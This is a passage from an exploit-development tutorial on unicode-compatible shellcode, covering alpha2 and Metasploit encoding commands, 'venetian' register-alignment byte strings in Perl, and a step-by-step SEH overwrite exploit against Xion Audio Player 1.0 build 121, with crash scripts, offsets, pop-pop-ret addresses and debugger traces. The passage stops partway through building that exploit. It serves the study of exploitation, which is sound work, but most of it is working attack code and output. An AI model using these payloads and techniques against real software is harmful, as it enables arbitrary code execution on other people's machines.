(This is the ASCII shellcode\nthat will get executed after the decoder has done its work.)\n[70]image\nSave the file, and run the script.\nThe output will show :\n\u2013 the original shellcode\n\u2013 the new shellcode (the one that includes the decoder).\nNow use this \u2018new\u2019 shellcode in your exploit and make sure eax points\nat the beginning of this shellcode.  You\u2019ll most likely will have to\ntweak the registers (unless you got lucky).\nWhen the registers are set up, simply run \u201cjump eax\u201d and the decoder\nwill extract the original shellcode and run it.   Again, the next\nchapter will show you how to set up\/tweak the registers and make the\njump using unicode-compatible code.\nNote1 : this newly generated encoder+shellcode will ONLY work when it\ngets converted to unicode first, and then executed. So you cannot use\nthis type of shellcode in a non-unicode exploit.\nNote 2 : despite the fact that the algorithm used in this script is an\nimprovement over makeunicode2.py, you\u2019ll still end up with quite long\nshellcode. So you need proper buffer space (or short, non-complex\nshellcode) in order to be able to use this technique.\n3. [71]alpha2 (SkyLined)\nThe famous alpha2 encoder (also adopted in other tools such as\nmetasploit, and a bunch of other tools) will take your original\nshellcode, wrap it in a decoder (pretty much like what vense.pl does),\nbut the advantage here is\n\u2013 you only need a register that points at the beginning of this\nshellcode. You don\u2019t need an additional register that is\nwritable\/executable.\n\u2013 the decoder will unwrap the original code in-place. The decoder is\nself-modifying, and the total amount of the required buffer space is\nsmaller.\n(the documentation states \u201cThe decoder will changes it\u2019s own code to\nescape the limitations of alphanumeric code. It creates a decoder loop\nthat will decode the original shellcode from the encoded data. It\noverwrites the encoded data with the decoded shellcode and transfers\nexecution to it when done. To do this, it needs read, write and execute\npermission on the memory it\u2019s running in and it needs to know it\u2019s\nlocation in memory (it\u2019s baseaddress)\u201d\nThis is how it works :\n1. generate raw shellcode with msfpayload\n2. convert the raw shellcode into a unicode string using alpha2 :\nroot@bt4:\/# cd pentest\nroot@bt4:\/pentest# cd exploits\/\nroot@bt4:\/pentest\/exploits# cd framework3\n.\/msfpayload windows\/exec CMD=calc R > \/pentest\/exploits\/runcalc.raw\nroot@bt4:\/pentest\/exploits\/framework3# cd ..\nroot@bt4:\/pentest\/exploits# cd alpha2\n.\/alpha2 eax --unicode --uppercase < \/pentest\/exploits\/runcalc.raw\nPPYAIAIAIAIAQATAXAZAPA3QAD...0LJA\n(I have removed the largest part of the output. Just generate your own\nshellcode & copy\/paste the output into you exploit script)\nPlace the output of the alpha2 conversion in your $shellcode variable\nin your exploit.  Again, make sure the register (eax in my example)\npoints at the first character of this shellcode, and make sure to jmp\neax (after setting up the register, if that was necessary)\nIf you cannot prepare\/use a register as base address, then alpha2 also\nsupports a technique that will attempt to calculate its own base\naddress by using SEH.  Instead of specifying a register, just specify\nSEH.  This way, you can just run the code (even if it\u2019s not pointed to\ndirectly in one of the registers), and it will still be able to decode\n& run the original shellcode).\n4. Metasploit\nI have tried to generate unicode compatible shellcode with metasploit,\nbut initially it didn\u2019t work the way I expected\u2026\nroot@krypt02:\/pentest\/exploits\/framework3#\n.\/msfpayload windows\/exec CMD=calc R |\n.\/msfencode -e x86\/unicode_upper BufferRegister=EAX -t perl\n[-] x86\/unicode_upper failed: BadChar; 0 to 1\n[-] No encoders succeeded.\n(Issue is filed at https:\/\/metasploit.com\/redmine\/issues\/430)\nStephen Fewer provided a workaround for this issue :\n.\/msfpayload windows\/exec CMD=calc R |\n.\/msfencode -e x86\/alpha_mixed -t raw |\n.\/msfencode -e x86\/unicode_upper BufferRegister=EAX -t perl\n(put everything on one line)\n(basically, encode with alpha_mixed first, and then with\nunicode_upper). The output will be unicode compatible shellcode for\nperl\nResult : Metasploit can do the trick also.\n5. UniShellGenerator by Back Khoa Internetwork Security\nThis tool is demonstrated in this presentation. Unfortunately I could\nnot find a copy of this tool anywhere, and the person\/people that wrote\nthe tool did not reply to me either\u2026\nPutting one and one together : preparing registers and jumping to shellcode\nIn order to be able to execute shellcode, you need to reach the\nshellcode.  Whether it\u2019s an ASCII version of the shellcode, or a\nunicode version (decoder), you will need to get there first.  In order\nto do that, you will often be required to set up registers in a\nparticular way, by using your own custom venetian shellcode, and\/or to\nwrite code that will make a jump to a given register.\nWriting these lines of code require a bit creativity,  require you to\nthink about registers, and will require you to be able to write some\nbasic assembly instructions.\nWriting jumpcode is purely based on the venetian shellcode principles.\nThis means that\n\u2013 you only have a limited instruction set\n\u2013 you need to take care of null bytes. When the code is put on the\nstack, null bytes will be inserted. So the instructions must work when\nnull bytes are added\n\u2013 you need to think about opcode alignment\nExample 1.\nLet\u2019s say you have found an ASCII version of your shellcode,\nunmodified, at 0x33445566, and you have noticed that you also control\neax.  You overwrite EIP with jump to eax, and now, the idea is to write\nsome lines of code at eax, which will make a jump to 0x33445566.\nIf this would not have been unicode, we could do this by using the\nfollowing instructions:\nbb66554433      #mov     ebx,33445566h\nffe3            #jmp     ebx\n=> We would have placed the following code at eax :\n\\xbb\\x66\\x55\\x44\\x33\\xff\\xe3, and we would have overwritten eip with\n\u201cjump eax\u201d.\nBut it\u2019s unicode. So obviously this won\u2019t work.\nHow can we achieve the same with unicode friendly instructions ?\nLet\u2019s take a look at the mov instruction first.  \u201cmov ebx\u201d = 0xbb,\nfollowed by what you want to put in ebx.  This parameter needs to be in\nthe 00nn00mm format (so, when null bytes are inserted, they would be\ninserted that already contains nulls (or where we expect nulls),\nwithout causing issues to the instructions).  You could for example do\nmov ebx, 33005500.  The opcode for this would be\nbb00550033      #mov     ebx,33005500h\nSo the bytes to write at eax (in our example) are  \\xbb\\x55\\x33.\nUnicode would insert null bytes, resulting in \\xbb\\x00\\x55\\x00\\x33,\nwhich is in fact the instruction we need.\nThe same technique applies to add and sub instructions.\nYou can use inc, dec instructions as well, to change registers or to\nshift positions on the stack.\nThe phrack article at [72]Building IA32 \u2018Unicode-Proof\u2019 Shellcodes\nshows the entire sequence of putting any address in a given register,\nshowing exactly what I mean. Going back to our example, we want to put\n0x33445566 in eax. This is how it\u2019s done :\nmov eax,0xAA004400        ; set EAX to 0xAA004400\npush eax\ndec esp\npop eax                   ; EAX = 0x004400??\nadd eax,0x33005500        ; EAX = 0x334455??\nmov al,0x0                ; EAX = 0x33445500\nmov ecx,0xAA006600\nadd al,ch                 ; EAX now contains 0x33445566\nIf we convert these instructions into opcodes, we get :\nb8004400aa      mov     eax,0AA004400h\n50              push    eax\n4c              dec     esp\n58              pop     eax\n0500550033      add     eax,33005500h\nb000            mov     al,0\nb9006600aa      mov     ecx,0AA006600h\n00e8            add     al,ch\nAnd here we see our next problem.  The mov and add instructions seem to\nbe unicode friendly. But what about the single byte opcodes ?  If null\nbytes are added in between them, the instructions are not going to work\nanymore.\nLet\u2019s see what I mean\nThe instructions above would be translated into the following payload\nstring :\n\\xb8\\x44\\xaa\\x50\\x4c\\x58\\x05\\x55\\x33\\xb0\\xb9\\x66\\xaa\\xe8\nor, in perl :\nmy $align=\"\\xb8\\x44\\xaa\";         #mov eax,0AA004400h\n$align=$align.\"\\x50\";             #push eax\n$align=$align.\"\\x4c\";             #dec esp\n$align=$align.\"\\x58\";             #pop eax\n$align = $align.\"\\x05\\x55\\x33\";   #add eax,33005500h\n$align=$align.\"\\xb0\";             #mov al,0\n$align=$align.\"\\xb9\\x66\\xaa\";     #mov ecx,0AA0660h\n$align=$align.\"\\xe8\";             #add al,ch\nWhen seen in a debugger, this string is converted into these\ninstructions :\n0012f2b4 b8004400aa      mov     eax,0AA004400h\n0012f2b9 005000          add     byte ptr [eax],dl\n0012f2bc 4c              dec     esp\n0012f2bd 005800          add     byte ptr [eax],bl\n0012f2c0 0500550033      add     eax,offset +0x330054ff (33005500)\n0012f2c5 00b000b90066    add     byte ptr [eax+6600B900h],dh\n0012f2cb 00aa00e80050    add     byte ptr [edx+5000E800h],ch\nOuch \u2013 what a mess. The first one is ok, but starting from the second\none, it\u2019s broken.\nSo it looks like we need to find a way to make sure the \u201cpush eax, dec\nesp, pop eax\u201d and other instructions are interpreted in a correct way.\nThe solution for this is to insert some safe instructions (think of it\nas NOPs), that will allow us to align the null bytes, without doing any\nharm to the registers or instructions. Closing the gaps, making sure\nthe null bytes and instructions are aligned in a proper way, is why\nthis technique was called venetian shellcode.\nIn our case, we need to find instructions that will \u201ceat away\u201d the null\nbytes that were added and causing issues. We can solve this by using\none of the following opcodes (depending on which register contains a\nwritable address and can be used) :\n00 6E 00:add byte ptr [esi],ch\n00 6F 00:add byte ptr [edi],ch\n00 70 00:add byte ptr [eax],dh\n00 71 00:add byte ptr [ecx],dh\n00 72 00:add byte ptr [edx],dh\n00 73 00:add byte ptr [ebx],dh\n(62, 6d are 2 others that can be used \u2013 be creative & see what works\nfor you)\nSo, if for example esi is writable (and you don\u2019t mind that something\nis written to the location pointed to by that register), then you can\nuse \\x6e between two instructions, in order to align the null bytes.\nExample :\nmy $align=\"\\xb8\\x44\\xaa\";         #mov eax,0AA004400h\n$align=$align.\"\\x6e\";             #nop\/align null bytes\n$align=$align.\"\\x50\";             #push eax\n$align=$align.\"\\x6e\";             #nop\/align null bytes\n$align=$align.\"\\x4c\";             #dec esp\n$align=$align.\"\\x6e\";             #nop\/align null bytes\n$align=$align.\"\\x58\";             #pop eax\n$align=$align.\"\\x6e\";             #nop\/align null bytes\n$align = $align.\"\\x05\\x55\\x33\";   #add eax,33005500h\n$align=$align.\"\\x6e\";             #nop\/align null bytes\n$align=$align.\"\\xb0\";             #mov al,0\n#no alignment needed between these 2 !\n$align=$align.\"\\xb9\\x66\\xaa\";     #mov ecx,0AA0660h\n$align=$align.\"\\x6e\";             #nop\/align null bytes\nIn the debugger, the instructions now look like this :\n0012f2b4 b8004400aa      mov     eax,0AA004400h\n0012f2b9 006e00          add     byte ptr [esi],ch\n0012f2bc 50              push    eax\n0012f2bd 006e00          add     byte ptr [esi],ch\n0012f2c0 4c              dec     esp\n0012f2c1 006e00          add     byte ptr [esi],ch\n0012f2c4 58              pop     eax\n0012f2c5 006e00          add     byte ptr [esi],ch\n0012f2c8 0500550033      add     eax,offset +0x330054ff (33005500)\n0012f2cd 006e00          add     byte ptr [esi],ch\n0012f2d0 b000            mov     al,0\n0012f2d2 b9006600aa      mov     ecx,0AA006600h\n0012f2d7 006e00          add     byte ptr [esi],ch\n=> much better.  As you can see, you will have to play with this a\nlittle.  It\u2019s not a matter of putting \\x6e between every two\ninstructions, you need to test what the impact is and align\naccordingly.\nOk, so at this point, we have managed to put an address in eax.\nAll we now need to do is jump to that address.  Again, we need a couple\nlines of venetian code for this.  The easiest way to jump to eax is by\npushing eax to the stack, and then returning to the stack  (push eax,\nret)\nIn opcode, this is :\n50    ;push    eax\nc3    ;ret\n(C3 should get converted to C300.)\nIn venetian code, this is \\x50\\x6e\\xc3.\nAt this point, we have accomplished the following things\n\u2013 we have overwritten EIP with a useful instruction\n\u2013 we have written some lines of code to adjust a value in one of the\nregisters\n\u2013 we have jumped to that register.\nIf that register contains ASCII shellcode, and it gets executed, then\nit\u2019s game over.\nNote : of course, hardcoding an address is not recommended.  It would\nbe better if you use an offset value based on the contents of one of\nthe registers. You can then use add and sub instructions to apply the\noffset to that register, in order to get it to the desired value.\nNote 2 : If instructions do not get translated correctly, you may be\nusing a different unicode translation (perhaps due to language &\nregional options), which heavily influences the success of\nexploitation.  Check the translation table of FX, and see if you can\nfind another byte that, when converted to unicode, will do what you\nwant it to do. Example : if for example 0xc3 does not get translated to\n0xc3 0x00, then you can see if the unicode conversion is using the OEM\ncode page.  In that case, 0xc7 would get converted to 0xc3 0x00, which\ncan help you building the exploit.\nExample 2 :\nSuppose you want to put the address ebp +300 into eax (so you can then\njump to eax), then you will have to write the required assembly\ninstructions first and then apply the venetian shellcode technique so\nyou can end up with code that will get executed when converted to\nunicode.\nAssembly to put ebp+300h in eax :\npush ebp            ; put the address at ebp on the stack\npop eax             ; get address of ebp back from the stack and put it in eax\nadd eax,11001400    ; add 11001400 to eax\nsub eax,11001100    ; subtract 11001100 from eax. Result = eax+300\nIn opcode, this is :\n55              push    ebp\n58              pop     eax\n0500140011      add     eax,offset XXXX+0x1400 (11001400)\n2d00110011      sub     eax,offset XXXX+0x1100 (11001100)\nAfter applying the venetian shellcode technique, this is the string we\nneed to send :\nmy $align=\"\\x55\";                #push ebp\n$align=$align.\"\\x6e\";            #align\n$align=$align.\"\\x58\";            #pop eax\n$align=$align.\"\\x6e\";            #align\n$align=$align.\"\\x05\\x14\\x11\";    #add eax,0x11001400\n$align=$align.\"\\x6e\";            #align\n$align=$align.\"\\x2d\\x11\\x11\";    #sub eax,0x11001100\n$align=$align.\"\\x6e\";            #align\nIn the debugger, this looks like this :\n0012f2b4 55              push    ebp\n0012f2b5 006e00          add     byte ptr [esi],ch\n0012f2b8 58              pop     eax\n0012f2b9 006e00          add     byte ptr [esi],ch\n0012f2bc 0500140011      add     eax,offset XXXX+0x1400 (11001400)\n0012f2c1 006e00          add     byte ptr [esi],ch\n0012f2c4 2d00110011      sub     eax,offset XXXX+0x1100 (11001100)\n0012f2c9 006e00          add     byte ptr [esi],ch\nCool. We win.\nNow put the components together and you have a working exploit :\n\u2013 put something meaningful in eip\n\u2013 adjust registers if necessary\n\u2013 jump & run the shellcode (ASCII or via decoder)\nBuilding a unicode exploit \u2013 Example 1\nIn order to demonstrate the process of building a working\nunicode-compatible exploit, we\u2019ll use a vulnerability in Xion Audio\nPlayer v1.0 (build 121) detected by [73]Drag0n Rider on October 10th,\n2009.\nI have noticed that the link in the PoC code does not point to build\n121 anymore (and this exploit may only work against build 121), so you\ncan download a copy of this vulnerable application here :\nPlease log in to download Xion Audio Player 1.0 build 121 (2.7 MiB)\nIf you are interested in trying the latest version (it may be\nvulnerable as well), then you can dowload it here (thanks dellnull for\nmentioning this)\nThe PoC code published by Drag0n Rider indicates that a malformed\nplaylist file (.m3u) can crash the application.\nMy test environment (Windows XP SP3 English, fully patched) runs on\nVirtualBox.  Regional settings are set to English (US) (thanks Edi for\nverifying that the exploit works with these regional settings).\nWhen we try the PoC code, we see this :\nCode :\nmy $crash = \"\\x41\" x 5000;\nopen(myfile,'>DragonR.m3u');\nprint myfile $crash;\nOpen the application (in windbg or any other debugger), right-click on\nthe gui, choose \u201cplaylist\u201d and go to \u201cFile\u201d \u2013 \u201cLoad Playlist\u201d. Then\nselect the m3u file and see what happens.\nResult :\n(e54.a28): Access violation - code c0000005 (first chance)\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000041 ebx=019ca7ec ecx=02db3e60 edx=00130000 esi=019ca7d0 edi=0012f298\neip=01aec2a6 esp=0012e84c ebp=0012f2b8 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206\nDefaultPlaylist!XionPluginCreate+0x18776:\n01aec2a6 668902          mov     word ptr [edx],ax        ds:0023:00130000=6341\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\n0:000> !exchain\nimage00400000+10041 (00410041)\nInvalid exception stack at 00410041\nThe SE structure was overwritten and now contains 00410041 (which is\nthe result of the unicode conversion of AA)\nIn a \u2018normal\u2019 (ASCII) SEH overwrite, we need to overwrite the SE\nHandler with a pointer to pop pop ret, and overwrite next SEH with a\nshort jump.\nSo we need to do 3 things :\n\u2013 find the offset to the SE structure\n\u2013 find a unicode compatible pointer to pop pop ret\n\u2013 find something that will take care of the jump\nFirst things first : the offset. Instead of using 5000 A\u2019s, put a 5000\ncharacter metasploit pattern in $crash.\nResult :\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=0000006e ebx=02e45e6c ecx=02db7708 edx=00130000 esi=02e45e50 edi=0012f298\neip=01aec2a6 esp=0012e84c ebp=0012f2b8 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210202\nDefaultPlaylist!XionPluginCreate+0x18776:\n01aec2a6 668902          mov     word ptr [edx],ax        ds:0023:00130000=6341\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\n0:000> !exchain\n0012f2ac: BASS_FX+69 (00350069)\nInvalid exception stack at 00410034\n0:000> d 0012f2ac\n0012f2ac  34 00 41 00 69 00 35 00-41 00 69 00 36 00 41 00  4.A.i.5.A.i.6.A.\n0012f2bc  69 00 37 00 41 00 69 00-38 00 41 00 69 00 39 00  i.7.A.i.8.A.i.9.\n0012f2cc  41 00 6a 00 30 00 41 00-6a 00 31 00 41 00 6a 00  A.j.0.A.j.1.A.j.\n0012f2dc  32 00 41 00 6a 00 33 00-41 00 6a 00 34 00 41 00  2.A.j.3.A.j.4.A.\n0012f2ec  6a 00 35 00 41 00 6a 00-36 00 41 00 6a 00 37 00  j.5.A.j.6.A.j.7.\n0012f2fc  41 00 6a 00 38 00 41 00-6a 00 39 00 41 00 6b 00  A.j.8.A.j.9.A.k.\n0012f30c  30 00 41 00 6b 00 31 00-41 00 6b 00 32 00 41 00  0.A.k.1.A.k.2.A.\n0012f31c  6b 00 33 00 41 00 6b 00-34 00 41 00 6b 00 35 00  k.3.A.k.4.A.k.5.\nWhen we dump the SE structure (d 0012f2ac, we can see next SEH  (in\nred, contains 34 00 41 00) and SE Handler (in green, contains 69 00 35\n00)\nIn order to calculate the offset, we need to take the 4 bytes taken\nfrom both next SEH and SE Handler together, and use that as the offset\nsearch string :   34 41 69 35 ->  0x35694134\nxxxx@bt4 ~\/framework3\/tools\n$ .\/pattern_offset.rb 0x35694134 5000\n254\nok, so the script below should\n\u2013 make us hit the SE structure after 254 characters\n\u2013 overwrite next SEH with 00420042  (as you can see, only 2 bytes are\nrequired)\n\u2013 overwrite SE Handler with 00430043 (as you can see, only 2 bytes are\nrequired)\n\u2013 add more junk\nCode :\nmy $totalsize=5000;\nmy $junk = \"A\" x 254;\nmy $nseh=\"BB\";\nmy $seh=\"CC\";\nmy $morestuff=\"D\" x (5000-length($junk.$nseh.$seh));\n$payload=$junk.$nseh.$seh.$morestuff;\nopen(myfile,'>corelantest.m3u');\nprint myfile $payload;\nclose(myfile);\nprint \"Wrote \".length($payload).\" bytes\\n\";\nResult :\nFirst chance exceptions are reported before any exception handling.\nThis exception may be expected and handled.\neax=00000044 ebx=019c4e54 ecx=02db3710 edx=00130000 esi=019c4e38 edi=0012f298\neip=01aec2a6 esp=0012e84c ebp=0012f2b8 iopl=0         nv up ei pl nz na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00210206\nDefaultPlaylist!XionPluginCreate+0x18776:\n01aec2a6 668902          mov     word ptr [edx],ax        ds:0023:00130000=6341\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\nMissing image name, possible paged-out or corrupt data.\n0:000> !exchain\n0012f2ac:\nimage00400000+30043 (00430043)\nInvalid exception stack at 00420042\n0:000> d 0012f2ac\n0012f2ac  42 00 42 00 43 00 43 00-44 00 44 00 44 00 44 00  B.B.C.C.D.D.D.D.\n0012f2bc  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f2cc  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f2dc  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f2ec  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f2fc  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f30c  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f31c  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n=> SE Structure is nicely overwritten, and we can see the D\u2019s from\n$morestuff placed right after we have overwritten the SE structure.\nThe next step is finding a good pointer to pop pop ret. We need an\naddress that will perform a pop pop ret even if the first and third\nbytes are nulls)\nMy pvefindaddr plugin for ImmDbg will help you with that.  Open ImmDBG\nand load xion.exe in the debugger. Run the application, go to the\nplaylist dialog, select \u201cFile\u201d, \u201cLoad Playlist\u201d but don\u2019t load the\nplaylist file.\nGo back to the debugger and run !pvefindaddr p2\nThis will launch a search for all pop\/pop\/ret combinations in the\nentire process memory space, and write the output to a file called\nppr2.txt. This process can take a long time, so be patient.\n[74]image\n[75]image\nWhen the process has completed, open the file with your favorite text\neditor, and look for \u201cUnicode\u201d, or run the following command :\nC:\\Program Files\\Immunity Inc\\Immunity Debugger>type ppr2.txt | findstr Unicode\nret at 0x00470BB5 [xion.exe] ** Maybe Unicode compatible **\nret at 0x0047073F [xion.exe] ** Maybe Unicode compatible **\nret at 0x004107D2 [xion.exe] ** Maybe Unicode compatible **\nret at 0x004107FE [xion.exe] ** Maybe Unicode compatible **\nret at 0x00480A93 [xion.exe] ** Maybe Unicode compatible **\nret at 0x00450015 [xion.exe] ** Unicode compatible **\nret at 0x0045048B [xion.exe] ** Maybe Unicode compatible **\nret at 0x0047080C [xion.exe] ** Maybe Unicode compatible **\nret at 0x00470F41 [xion.exe] ** Maybe Unicode compatible **\nret at 0x00470F9C [xion.exe] ** Maybe Unicode compatible **\nret at 0x004800F5 [xion.exe] ** Unicode compatible **\nret at 0x004803FE [xion.exe] ** Maybe Unicode compatible **\nret 04 at 0x00480C6F [xion.exe] ** Maybe Unicode compatible **\nret at 0x00470907 [xion.exe] ** Maybe Unicode compatible **\nret at 0x00470C9A [xion.exe] ** Maybe Unicode compatible **\nret at 0x00470CD9 [xion.exe] ** Maybe Unicode compatible **\nret at 0x00470D08 [xion.exe] ** Maybe Unicode compatible **\nret at 0x004309DA [xion.exe] ** Maybe Unicode compatible **\nret at 0x00430ABB [xion.exe] ** Maybe Unicode compatible **\nret at 0x00480C26 [xion.exe] ** Maybe Unicode compatible **\nret at 0x00450AFE [xion.exe] ** Maybe Unicode compatible **\nret at 0x00450E49 [xion.exe] ** Maybe Unicode compatible **\nret at 0x00470136 [xion.exe] ** Maybe Unicode compatible **\nret at 0x00470201 [xion.exe] ** Maybe Unicode compatible **\nret at 0x00470225 [xion.exe] ** Maybe Unicode compatible **\nret at 0x004704E3 [xion.exe] ** Maybe Unicode compatible **\nret at 0x0047060A [xion.exe] ** Maybe Unicode compatible **\nret at 0x00470719 [xion.exe] ** Maybe Unicode compatible **\nret at 0x004707A4 [xion.exe] ** Maybe Unicode compatible **\nret at 0x00470854 [xion.exe] ** Maybe Unicode compatible **\nret at 0x00470C77 [xion.exe] ** Maybe Unicode compatible **\nret at 0x00470E09 [xion.exe] ** Maybe Unicode compatible **\nret at 0x00470E3B [xion.exe] ** Maybe Unicode compatible **\nret at 0x00480224 [xion.exe] ** Maybe Unicode compatible **\nret at 0x00480258 [xion.exe] ** Maybe Unicode compatible **\nret at 0x00480378 [xion.exe] ** Maybe Unicode compatible **\nret at 0x00480475 [xion.exe] ** Maybe Unicode compatible **\nret at 0x00470EFD [xion.exe] ** Maybe Unicode compatible **\nret at 0x00470F04 [xion.exe] ** Maybe Unicode compatible **\nret at 0x00470F0B [xion.exe] ** Maybe Unicode compatible **\nret at 0x00450B2D [xion.exe] ** Maybe Unicode compatible **\nret at 0x00480833 [xion.exe] ** Maybe Unicode compatible **\nret 04 at 0x00410068 [xion.exe] ** Unicode compatible **\nret 04 at 0x00410079 [xion.exe] ** Unicode compatible **\nret 04 at 0x004400C0 [xion.exe] ** Unicode compatible **\nret at 0x00470166 [xion.exe] ** Maybe Unicode compatible **\nThe addresses that should draw your immediate attention are the ones\nthat look to be Unicode compatible.  The pvefindaddr script will\nindicate addresses that have null bytes in the first and third byte.\nYour task now is to find the addresses that are compatible with your\nexploit. Depending on the unicode code page translation that was used,\nyou may or may not be able to use an address that contains a byte that\nis > 7f\nAs you can see, in this example we are limited to addresses in the\nxion.exe executable itself, which (luckily) is not safeseh compiled.\nIf we leave out all addresses that contain bytes > 7f, then we\u2019ll have\nto work with :\n0x00450015, 0x00410068, 0x00410079\nOk, let\u2019s test these 3 addresses and see what happens.\nOverwrite SE Handler with one of these addresses, and overwrite next\nSEH with 2 A\u2019s (0x41 0x41)\nCode :\nmy $totalsize=5000;\nmy $junk = \"A\" x 254;\nmy $nseh=\"\\x41\\x41\";  #nseh -> 00410041\nmy $seh=\"\\x15\\x45\";   #put 00450015 in SE Handler\nmy $morestuff=\"D\" x (5000-length($junk.$nseh.$seh));\n$payload=$junk.$nseh.$seh.$morestuff;\nopen(myfile,'>corelantest.m3u');\nprint myfile $payload;\nclose(myfile);\nprint \"Wrote \".length($payload).\" bytes\\n\";\nResult :\n0:000> !exchain\n0012f2ac:\nimage00400000+50015 (00450015)\nInvalid exception stack at 00410041\nIf we place a breakpoint at 00450015, we should see the following\nresult after pressing F5 and then stepping through the instructions :\n0:000> bp 00450015\n0:000> g\nBreakpoint 0 hit\neax=00000000 ebx=00000000 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000\neip=00450015 esp=0012e47c ebp=0012e49c iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246\nimage00400000+0x50015:\n00450015 5b              pop     ebx\n0:000> t\neax=00000000 ebx=7c9032a8 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000\neip=00450016 esp=0012e480 ebp=0012e49c iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246\nimage00400000+0x50016:\n00450016 5d              pop     ebp\n0:000> t\neax=00000000 ebx=7c9032a8 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000\neip=00450017 esp=0012e484 ebp=0012e564 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246\nimage00400000+0x50017:\n00450017 c3              ret\n0:000> t\neax=00000000 ebx=7c9032a8 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000\neip=0012f2ac esp=0012e488 ebp=0012e564 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246\n+0x12f2ab:\n0012f2ac 41              inc     ecx\n0:000> d eip\n0012f2ac  41 00 41 00 15 00 45 00-44 00 44 00 44 00 44 00  A.A...E.D.D.D.D.\n0012f2bc  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f2cc  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f2dc  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f2ec  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f2fc  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f30c  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\n0012f31c  44 00 44 00 44 00 44 00-44 00 44 00 44 00 44 00  D.D.D.D.D.D.D.D.\nWe can see the pop pop ret getting executed, and after the ret, a jump\nis made to the SE record (nseh) at 0012f2ac\nThe first instruction at nseh is  0x41 (which is \u201cinc ecx\u201d). When we\ndump the contents of eip (before running the instruction), we see the 2\nA\u2019s at nseh (41 00 41 00), followed by 15 00 45 00 (=SE Handler), and\nthen D\u2019s (from $morestuff). In a typical SEH based exploit, we would\nwant to jump to the D\u2019s.  Now, instead of writing jumpcode at nseh\n(which will be almost impossible to do), we can just \u201cwalk\u201d to the D\u2019s.\nAll we need is\n\u2013 some instructions at nseh that will act like a nop, (or can even help\nus preparing the stack of later on)\n\u2013 the confirmation that the address at SE Handler (15 00 45 00), when\nit gets executed as if it were instructions, don\u2019t do any harm either.\nThe 2 A\u2019s at nseh, when they are executed, will do this :\neax=00000000 ebx=7c9032a8 ecx=00450015 edx=7c9032bc esi=00000000 edi=00000000\neip=0012f2ac esp=0012e0c4 ebp=0012e1a0 iopl=0         nv up ei pl zr na pe nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246\n+0x12f2ab:\n0012f2ac 41              inc     ecx\n0:000> t\neax=00000000 ebx=7c9032a8 ecx=00450016 edx=7c9032bc esi=00000000 edi=00000000\neip=0012f2ad esp=0012e0c4 ebp=0012e1a0 iopl=0         nv up ei pl nz na po nc\ncs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202\n+0x12f2ac:\n0012f2ad 004100          add     byte ptr [ecx],al          ds:0023:00450016=5d\nThe first instruction seems to be more or less harmless, but the second\none will cause another exception, bringing us back at nSEH\u2026 so that\u2019s\nnot going to work.\nPerhaps we can use one of the following instructions again :\n00 6E 00:add byte ptr [esi],ch\n00 6F 00:add byte ptr [edi],ch\n00 70 00:add byte ptr [eax],dh\n00 71 00:add byte ptr [ecx],dh\n00 72 00:add byte ptr [edx],dh\n00 73 00:add byte ptr [ebx],dh\nThere are some other instructions that would work as well (62, 6d, and\nso on)\nAnd perhaps the first instruction (41 = inc eax) could be replaced by a\npopad (=\\x61) (which will put something in all registers\u2026  this may\nhelp us later on)\nSo overwrite nseh with 0x61 0x62 and see what it does :\nCode :\nmy $totalsize=5000;\nmy $junk = \"A\" x 254;\nmy $nseh=\"\\x61\\x62\";  #nseh -> popad + nop\/align\nmy $seh=\"\\x15\\x45\";   #put 00450015 in SE Handler\nmy $morestuff=\"D\" x (5000-length($junk.$nseh.$seh));\n$payload=$junk.$nseh.$seh.$morestuff;\nopen(myfile,'>corelantest.m3u');\nprint myfile $payload;\nclose(myfile);\nprint \"Wrote \".length($payload).\" bytes\\n\";\nResult :\n0:000> 